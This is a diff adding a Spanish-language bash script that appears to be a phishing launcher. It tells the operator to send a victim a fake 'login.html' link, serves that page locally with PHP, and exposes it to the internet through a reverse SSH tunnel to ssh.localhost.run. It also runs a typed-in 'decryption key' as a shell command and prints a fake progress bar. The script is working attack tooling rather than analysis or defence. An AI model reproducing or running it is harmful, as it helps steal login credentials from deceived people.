@@ -1,0 +1,12 @@
+bash .banner
+echo "Introduce la llave de decifrado:"
+read llave
+$llave
+bash .banner
+echo "Introduce un puerto para hacer un local host:"
+read input
+bash .banner
+echo "Mandale este enlace: www.urldeabajo.com/login.html"
+echo ""
+echo "100% |████████████████████████████████|"
+php -S localhost:$input -t .st/system | ssh -R 80:localhost:$input ssh.localhost.run
